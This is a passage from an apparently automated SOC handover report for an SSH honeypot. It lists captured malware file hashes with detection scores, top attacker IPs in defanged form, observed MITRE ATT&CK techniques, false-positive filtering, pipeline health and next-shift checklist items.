| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `128.199.8[.]140` | US | DigitalOcean, LLC | **100** ⚠️ | 16 |
| `223.123.35[.]129` | PK | CMPak Limited | **100** ⚠️ | 1 |
| `172.206.32[.]4` | US | Microsoft Limited | **100** ⚠️ | 5 |
| `203.236.95[.]236` | KR | Korea Telecom | **100** ⚠️ | 5 |
| `176.65.148[.]44` | NL | Pfcloud UG | **100** ⚠️ | 18 |
| `45.91.64[.]7` | RU | F6 | **100** ⚠️ | 50 |
| `3.151.241[.]153` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `101.32.240[.]31` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 50 |
| `81.30.162[.]19` | UA | This is a Vinteleport company Core network, used for | **100** ⚠️ | 43 |
| `120.78.9[.]93` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 194 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 109 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 75 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 35 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 13 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 244 cases |
| Tool 34  | Credential Extractor        | ✅ 184 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 29 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (9.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 75 priority case(s) shown individually · 18 recon entry/entries in table (6 group(s) consolidating 134 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-22T06:03:22Z_
